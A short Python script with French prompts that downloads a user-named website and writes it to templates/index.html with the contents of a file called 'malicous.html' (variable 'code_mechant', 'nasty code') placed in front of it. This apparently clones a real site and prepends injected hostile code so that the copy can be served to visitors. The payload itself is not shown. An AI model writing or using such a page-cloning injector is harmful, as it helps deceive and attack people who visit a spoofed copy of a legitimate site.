import requests

input_user=input("nom du site a scrapper : ")

rq = requests.get(input_user)
# print(rq.text)
with open("templates/index.html", "wb") as file:
    with open("malicous.html", "rb") as code_mechant:
        code_injecter = code_mechant.read()
    file.write(code_injecter)
    file.write(rq.text.encode("utf-8"))
    
    